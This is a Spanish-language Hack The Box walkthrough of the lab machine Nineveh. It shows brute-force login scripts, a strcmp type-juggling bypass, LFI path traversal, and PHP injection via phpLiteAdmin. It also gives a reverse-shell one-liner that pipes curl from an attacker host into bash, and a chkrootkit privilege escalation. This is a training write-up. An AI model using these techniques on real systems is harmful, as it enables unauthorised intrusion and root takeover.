---
layout: post
title: HTB_Nineveh
date: 2023/07/10
slug: HTB_Nineveh
heroImage: /assets/machines.jpg
---

# Nineveh {-}

## Introduccion {-}

La maquina del dia 06/08/2021 se llama Nineveh
.

El replay del live se puede ver aqui

<iframe width="560" height="315" src="https://www.youtube.com/embed/ATDC1eGgnp0?si=l3BGi2oliPDmljcu" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

No olvideis dejar un like al video y un comentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.43
```
ttl: 63 -> maquina Linux. 
Recordar que en cuanto a ttl respecta 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl 
disminuya en una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.43
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.43 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,443 10.10.10.43 -oN targeted
```

| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 80     | http     | Web, fuzzing       |            |
| 443    | https    | Web, fuzzing       |            |


### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.43
whatweb https://10.10.10.43
```

Los dos resultados son los mismos y no hay nada muy interesante

#### Chequear la web por comparar los 2 puertos {-}

Con firefox navegamos en la web para ver lo que es. 

- el puerto 80 nos muestra una pagina por defecto
- el puerto 443 nos muestra una webapp con una imagen.

El resultado de los 2 puertos muestran resultados diferentes y parece que la buena web app esta en el puerto 443. Delante de esta situacion,
siempre es interesante mirar lo que hay en el certificado

#### Chequear el contenido de el certificado SSL con openssl {-}

```bash
openssl s_client -connect 10.10.10.43:443
```

vemos una direccion de correo 
```bash
 admin@nineveh.htb 
```
 lo que quiere decir que tenemos un usuario y un dominio. 
Como no tenemos mucha mas informacion, vamos a fuzzear la web.

#### Fuzzing con WFuzz {-}

Fuzzeamos el puerto 80

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.43/FUZZ
```

Encontramos una ruta 
```bash
 /department 
```
.

y tambien el puerto 443


```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.43/FUZZ
```

Encontramos una ruta 
```bash
 /db 
```
.

#### Analizamos el directorio department de puerto 80 {-}

Aqui vemos una pagina de Login. El wappalizer no nos muestra algo nuevo. Poniendo como nombre de usuario **admin**, la web
nos señala un mensaje 
```bash
 invalid password 
```
 lo que quiere decir que el usuario existe. Vamos a utilizar fuzzing con **BurpSuite**
para encontrar la contraseña del usuario admin.

#### Analizamos el directorio db de puerto 443 {-}

Aqui vemos una pagina de Login para un servicio 
```bash
 phpLiteAdmin 
```
 de version **1.9**. Buscamos en internet si hay un default password para este servicio y
efectivamente el default password del servicio es **admin** pero en este caso no funciona.


## Evaluacion de vulnerabilidades {-}

### Ataque de tipo intruder con burpsuite para el panel en el puerto 80 {-}

> [ ! ] NOTA: como ya hemos echo este tipo de ataque en la maquina **TheNotebook**, las imagenes que siguen corresponden a la maquina **TheNotebook**. La technica
es exactamente la misma, solo la IP y la url de las imagenes cambian.

1. Creamos un diccionario basado en el rockyou.txt

    ```bash
    cd content
    head -n 10000 /usr/share/wordlists/rockyou.txt > passwords
    ```

1. Desde burpsuite configuramos el scope hacia la url http://10.10.10.43
1. En firefox le ponemos el foxyproxy para el burpsuite
1. Lanzamos una peticion desde login con admin admin y la interceptamos con el burpsuite
1. En burpsuite le damos al 
```bash
 Ctrl+i 
```
 para enviarlo al intruder
1. Configuramos el attacker **Sniper** dando la posicion a la palabra password


![otebook-sier-cofi](/assets/images/notebook-sniper-config.png) 
1. Cargamos el diccionario creado a la payload list y le quitamos el Payload encoding

    ```{r, echo = FALSE, fig.cap="nineveh sniper payload list", out.width="90%"}
    knitr::include_graphics("images/notebook-sniper-list.png")

![otebook-sier-list](/assets/images/notebook-sniper-list.png) 
    - en Grep - Extract damos a ADD
    - le damos a Fetch response y seleccionamos el campo invalid password

        ```{r, echo = FALSE, fig.cap="nineveh sniper fetch response", out.width="90%"}
        knitr::include_graphics("images/notebook-fetch-response.png")
        ```

lo dejamos un ratito y ya podemos ver que filtrando por esta columna vemos una linea donde no esta escrito esto. Ya tenemos la contraseña.
![otebook-fetch-resose](/assets/images/notebook-fetch-response.png) 

### Bruteforcear la contraseña con python {-}

Este seria la manera de hacer, lo que hemos echo con Burpsuite pero en python. El script nos viene del compañero s4dbrd.

```python
#!/usr/bin/python3

import requests
import pdb
import sys
import signal

from pwn import *

# Variables Globales
login_url = 'http://nineveh.htb/department/login.php'


f = open("rockyou.txt", "r")

def def_handler(sig, frame):
    print("\n\nSaliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def bruteForce():
 
    s = requests.Session()

    passwords = f.readlines()
      
    for password in passwords:
        

        login_data = {
            'username': 'admin',
            'password': password.rstrip()
        }

        p1.status("Probando con la contraseña %s" %password)
        r = s.post(login_url, data=login_data)
        
        if 'Invalid Password!' not in r.text:
            p1.success("La contraseña correcta es %s" %password)
            sys.exit(0)

if __name__ == '__main__':

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)

    bruteForce()
```

### Burlear el login panel con TypeJuggling {-}

Mas tarde en el video, el Tito nos muestra el codigo fuente de la pagina de login y se ve que en la comparativa del input **Password**, el
desarollador de la pagina utiliza un codigo php 

```php
if(isset($_POST['username'] == $USER){
    if(strcmp($_POST['password'], $PASS ) == 0){
        S_SESSION['username'] = $USER;
        header( 'Location: manage.php' );
    }
}
```

El problema aqui es que usado el comando 
```bash
 strcmp() 
```
 para el password permite al atacante de burlar esto con un cambio de tipo.

Si la request normal es como la siguiente y nos pone 
```bash
 incorrect password 
```


```bash
POST /login.php HTTP/1.1
Host: 10.10.10.10
User-Agent: ...
Cookie: PHPSESSID=o36osnz71uw900ln395jhs

username=admin&password=admin
```

cambiandole el payload de la siguiente manera nos loggea sin problema

```bash
POST /login.php HTTP/1.1
Host: 10.10.10.10
User-Agent: ...
Cookie: PHPSESSID=o36osnz71uw900ln395jhs

username=admin&password[]=a
```

El symbolo 
```bash
 [] 
```
 cambia el tipo de variable y el 
```bash
 strcmp() 
```
 lo acepta. 

### Ataque de tipo intruder con burpsuite para el panel en el puerto 443 {-}

Para el panel de authentification del **phpLiteAdmin**, utilizamos la misma tecnica que para el panel de authentification del puerto 80 (Burpsuite).
De esta manera tambien encontramos la contraseña y nos podemos conectar a la base de datos.

### Bruteforcear la contraseña con python {-}

Este seria la manera de bruteforcear la contraseña con python. Este Script tambien nos viene del compañero s4dbrd.

```python
#!/usr/bin/python3

import requests
import pdb
import sys
import signal
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from pwn import *

# Variables Globales
login_url = 'https://nineveh.htb/db/index.php'


f = open("rockyou.txt", "r")

def def_handler(sig, frame):
    print("\n\nSaliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def bruteForce():
 
    s = requests.Session()

    passwords = f.readlines()
      
    for password in passwords:
        

        login_data = {
            'password': password.rstrip(),
            'login': "Log+In",
            'proc_login': "true"
        }

        p1.status("Probando con la contraseña %s" %password)
        r = s.post(login_url, data=login_data, verify=False)
        
        if 'Incorrect password.' not in r.text:
            p1.success("La contraseña correcta es %s" %password)
            sys.exit(0)

if __name__ == '__main__':

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)
```

### Analizamos el panel de administracion del puerto 80 {-}

Aqui vemos un link llamado Notes, pinchamos y se ve una nota. 
Nos llama la atencion la url 
```bash
 10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt 
```

Intentamos ver si es vulnerable a un **LFI**

```bash
10.10.10.43/department/manage.php?notes=files/../../../../../../etc/passwd
10.10.10.43/department/manage.php?notes=files/../../../../../../etc/passwd%00
```

Aqui nos pone la pagina un mensaje 
```bash
 No notes selected 
```
. Probamos mas cosas.

```bash
10.10.10.43/department/manage.php?notes=files/ninevehNotes
10.10.10.43/department/manage.php?notes=files/ninevehNote
```

La differentes respuestas nos hacen pensar que hay un systema de White words list que functionna unicamente si tenemos la palabra
**ninevehNotes**

```bash
10.10.10.43/department/manage.php?notes=files/ninevehNotes/../../../../../../etc/passwd
10.10.10.43/department/manage.php?notes=ninevehNotes/../../../../../../etc/passwd
10.10.10.43/department/manage.php?notes=/ninevehNotes/../etc/passwd
```

Ya podemos ver el contenido del 
```bash
 /etc/passwd 
```
 y vemos un usuario **amrois**

Miramos mas contenidos interresantes

### Checkeamos los puertos internos de la maquina {-}

Siempre es buena idea mirrar los puertos internos que estan abiertos. Desde fuera, connocemos los puertos 80 y 443.

1. Approvechamos del LFI para ver el fichero proc tcp

    ```bash
    10.10.10.43/department/manage.php?notes=files/ninevehNotes/../proc/tcp
    ```

1. copiamos esto en un fichero llamado data
1. recuperamos la columna que contiene los puertos

    ```bash
    cat data
    cat data | awk '{print $2}'
    cat data | awk '{print $2}' | grep -v "address"
    cat data | awk '{print $2}' | grep -v "address" | awk '{print $2}' FS=":"
    cat data | awk '{print $2}' | grep -v "address" | awk '{print $2}' FS=":" | sort -u
    ```

Aqui vemos 3 puertos en formato hexadecimal. Lo miramos con python

```python
python3

>>> 0x0016
22
>>> 0x0050
80
>>> 0x01BB
443
```

Ya sabemos ahora que hay el puerto 22 (ssh) que esta abierto internamente.


### Checkeamos las informaciones del usuario amrois {-}

```bash
10.10.10.43/department/manage.php?notes=files/ninevehNotes/../home/amrois/.ssh/id_rsa
10.10.10.43/department/manage.php?notes=files/ninevehNotes/../home/amrois/user.txt
```

No vemos nada. Vamos a ver lo que podemos hacer con la base de datos del puerto 443

### Analyzando la base de datos {-}

```bash
searchsploit phpliteadmin 1.9
```

Aqui vemos un exploit tipo Multiple Vulnerabilities y una Remote PHP Code Injection. Miramos el del RPCI

```bash
searchsploit -x 24044
```

Aqui vemos que si creamos una base de datos, el nombre que entramos sera seguido de la extension apropriada. Un atacante puede
crear una base de datos con una extension php y insertar PHP code para posteriorment ejecutarlo.
## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Conexion desde phpliteadmin {-}

1. Creamos una base de datos llamada hack.php

    ```{r, echo = FALSE, fig.cap="create hack.php database", out.width="90%"}
    knitr::include_graphics("images/phpliteadmin-hack-php.png")
    ```

    Si pinchamos el link de la hack.php database vemos que a sido creado en 
```bash
 /var/tmp/hack.php 
```


    knitr::include_graphics("images/phpliteadmin-create-table.png")
![hliteadmi-hack-h](/assets/images/phpliteadmin-hack-php.png) 
    ```

1. Entramos un comando PHP en la tabla

    ```{r, echo = FALSE, fig.cap="insert php command", out.width="90%"}
    knitr::include_graphics("images/phpliteadmin-insert-command.png")

![hliteadmi-create-table](/assets/images/phpliteadmin-create-table.png) 
1. y con el uso de la LFI miramos lo que passa

    ```{r, echo = FALSE, fig.cap="phpliteadmin RCE", out.width="90%"}
    knitr::include_graphics("images/phpliteadmin-rce.png")

![hliteadmi-isert-commad](/assets/images/phpliteadmin-insert-command.png) 
1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

    #!/bin/bash
![hliteadmi-rce](/assets/images/phpliteadmin-rce.png) 

    bash -i >& /dev/tcp/10.10.14.8/443 0>&1
    ```

1. Compartimos un servidor web con *python*

    ```bash
    python3 -m http.server 80
    ```

1. Lanzamos la reverse shell por la web

    ```bash
    10.10.10.43/department/manage.php?notes=files/ninevehNotes/../var/tmp/hack.php&cmd=curl -s 10.10.14.8|bash
    ```
    
ya hemos ganado accesso al sistema.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Analizamos el sistema {-}

```bash
pwd
ls -l
cd ..
ls
cd ..
ls
```

Aqui vemos que hay un directorio llamado 
```bash
 ssl 
```
 que contiene otro directorio 
```bash
 secure_notes 
```
 y como todo esto esta en 
```bash
 /var/www/html 
```

miramos en firefox lo que es. 
```bash
 https://10.10.10.43/secure_notes 
```
 y vemos una imagen. Como el directorio se llama secure_notes, pensamos 
directamente en steganografia y nos descargamos la image

### Analizando los bits menos significativos de la imagen {-}

```bash
steghide info nineveh.png
file nineveh.png
exiftool nineveh.png
strings nineveh.png
```

El comando strings nos muestra una key id_rsa privada y una publica del usuario amrois. Como no tenemos accesso al ssh desde fuera copiamos esta clave 
en la maquina victima y le hacemos el tratamiento de siempre

### Conexion por SSH {-}

En la maquina victima:

```bash
cd /tmp
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa amrois@localhost
```

Ya estamos conectados como amrois y podemos leer la flag.

### Otra manera de conectarnos a la maquina {-}

Si durante el analisis del sistema hubieramos ido hasta mirar los processos que estan habiertos en background, ubieramos encontrado que la utilidad

```bash
 knockd 
```
 estava lanzada.

**Knockd** es una utilidad para escuchar o lanzar Port Knocking.

```bash
ps -faux
cat /etc/knockd.conf
```

Aqui podemos ver que si Knockamos los puertos 571,290,911 se abriria el puerto 22 al exterior y si Knockeamos los puertos 911,290,571 se ceraria.

lo comprobamos desde la maquina de atacante:

```bash
nmap -p22 10.10.10.43 --open -T5 -v -n
```

Aqui vemos quel puerto 22 esta cerrado

```bash
knock 10.10.10.43 571:tcp 290:tcp 911:tcp
nmap -p22 10.10.10.43 --open -T5 -v -n
```

Aqui vemos que el puerto 22 se a abierto, y desde aqui nos podemos connectar por ssh como el usuario amrois.







## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
ls -la
id
sudo -l
cd /root
```

Aqui no vemos nada interesante y no podemos entrar en el directorio root.

#### Analisis de processos con PSPY {-}

instalamos la herramienta en la maquina de atacante y lo compartimos con un web server.

```bash
git clone https://github.com/DominicBreuker/pspy
cd pspy
go build -ldflags "-s -w" main.go
upx main
mv main pspy
python3 -m http.server 80
```

Desde la maquina victima, downloadeamos el fichero y lo lanzamos

```bash
wget http://10.10.14.8/pspy
chmod +x pspy
./pspy
```

Esperamos un poco y vemos que hay un script 
```bash
 /usr/bin/chkrootkit 
```
 que se ejecuta a interval regular de tiempo.

#### Priviledge escalation con chkrootkit {-}

```bash
searchsploit chkrootkit
```

Ya vemos que hay un exploit para Local Priviledge Escalation. Lo analizamos.

```bash
searchsploit -x 33899
```

Creamos un fichero llamado update en tmp

```bash
cd /tmp
echo '#!/bin/bash\n\nchmod 4755 /bin/bash' > update
chmod +x update
watch -n 1 ls -l /bin/bash
```

Ya podemos utilizar bash para convertirnos en root

```bash
bash -p
whoami
#Output

root
```

Ya hemos rooteado la maquina y podemos ver la flag.

